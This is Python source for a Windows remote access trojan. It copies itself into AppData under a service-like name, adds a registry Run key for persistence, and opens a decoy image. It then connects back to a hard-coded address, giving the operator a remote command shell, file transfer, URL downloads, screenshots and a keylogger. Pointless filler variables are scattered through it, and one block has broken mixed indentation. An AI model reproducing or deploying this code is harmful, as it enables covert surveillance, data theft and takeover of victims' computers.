#!/usr/bin/python
import socket
import subprocess
import json
import time
import os
import shutil
import sys
import base64
import requests
import ctypes
import threading
import keylogger
from mss import mss

def reliable_send(data):
        json_data = json.dumps(data)
        sock.send(json_data)

def reliable_recv():
        json_data = ""
        while True:
                try:
                        json_data = json_data + sock.recv(1024)
                        return json.loads(json_data)
                except ValueError:
                        continue

def is_admin():
	global admin
	try:
		temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\windows'),'temp']))
	except:
		admin="User Privileges"
	else:
		admin="Administrator Privileges"

def screenshot():
        Num1 = 2
        with mss() as screenshot:
                pri = Num1 * 3
                screenshot.shot()



def download(url):
	get_response = requests.get(url)
	file_name = url.split("/")[-1]
	with open(file_name, "wb") as out_file:
		out_file.write(get_response.content)

def connection():
	while True:
		time.sleep(20)
		try:
			sock.connect(("192.168.1.8",54321))
			shell()
		except:
			connection()

def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			try:
				os.remove(keylogger_path)
			except:
				continue
			break
		elif command == "help":
			help_options = '''                                          download path  -> Download A file From Target PC
					  upload path    -> Upload a file to Target PC
					  get url        -> Download a file From any website
					  start path     -> Start a program on Target PC
					  screenshot     -> Take Screenshot of target PC
					  check          -> Check For administration privliledge 
					  keylog_start   -> Start Keylogger
					  keylog_dump    -> Print Keylogger
                                          q              -> Quit                                  '''
			reliable_send(help_options) 
		elif command[:2] == "cd" and len(command) > 1:
			try:
				os.chdir(command[3:])
			except:
				continue
		elif command[:8] == "download":
			with open(command[9:], "rb") as file:
				reliable_send(base64.b64encode(file.read()))
		elif command[:6] == "upload":
			with open(command[7:], "wb") as fin:
				result = reliable_recv()
				fin.write(base64.b64decode(result))
		elif command[:3] == "get":
			try:
				download(command[4:])
				reliable_send("[+] Download file From Specified URL!")
			except:
				reliable_send("[!!] Failed To Download File")
		elif command[:5] == "start":
			try:
				subprocess.Popen(command[6:], shell=True)
				reliable_send("[+] Started!")

			except:
				reliable_send("[!!] Failed To Start!")
		elif command[:10] == "screenshot":
            try:
                Num2 = 3
                screenshot()
                Num3 = 4
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                    NUM5 = Num3 + Num2
                    os.remove("monitor-1.png")
            except:
                NUM8 = 4
                reliable_send("[!!] Failed to take screenshot")
		elif command[:5] == "check":
			try:
				is_admin()
				reliable_send(admin)
			except:
				reliable_send("Cant perform the Check")
		elif command[:12] == "keylog_start":
			t1 = threading.Thread(target=keylogger.start)
			t1.start()
		elif command[:11] == "keylog_dump":
			fn = open(keylogger_path,"r")
			reliable_send(fn.read())
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result)
			except:
				reliable_send("[!!] Cant Execute That Command")

keylogger_path = os.environ["appdata"] + "\\processmanager.txt"
location = os.environ["appdata"] + "\\WindowService.exe"
if not os.path.exists(location):
        shutil.copyfile(sys.executable, location)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v WindowService /t REG_SZ /d "' + location + '"', shell=True)

        name =  sys._MEIPASS + "/MicrosoftService.jpg"
        try:
                subprocess.Popen(name, shell = True)

        except:
                number = 3
                number1 = 5
                addition = number + number1
sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection()
sock.close()

